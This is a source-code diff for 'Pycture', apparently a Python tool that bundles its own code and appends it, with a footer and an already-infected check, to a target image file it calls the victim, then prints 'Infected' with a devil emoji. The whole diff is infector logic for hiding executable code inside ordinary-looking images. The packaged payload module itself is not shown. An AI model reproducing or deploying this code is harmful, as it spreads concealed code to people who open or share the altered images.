@@ -6,8 +6,10 @@ Pycture main code
 from pathlib import Path
 
 from utils.parse_argv import parse_argv
-from utils.code_pkg import packaged_code
 from utils.image_io import Image_IO
+from utils.footer import create_footer, read_footer
+from utils.check import checks
+from utils.code_pkg import packaged_code
 
 
 def pycture() -> None:
@@ -16,10 +18,17 @@ def pycture() -> None:
     """
     args = parse_argv()
     img_io = Image_IO(args.victim_path)
-    code_bytes = packaged_code(Path(__file__).parent)
     img_bytes = img_io.read()
-    img_io.write(code_bytes + img_bytes)
-    print(f"Infected {args.victim_path} 😈")
+    if args.reverse:
+        print("No")
+    else:
+        if not checks(img_bytes):
+            print(f"{args.victim_path} is already infected 🎉")
+            return
+        code_bytes = packaged_code(Path(__file__).parent)
+        footer = create_footer(img_bytes)
+        img_io.write(img_bytes + code_bytes + footer.bytes_)
+        print(f"Infected {args.victim_path} 😈")
 
 
 if __name__ == "__main__":
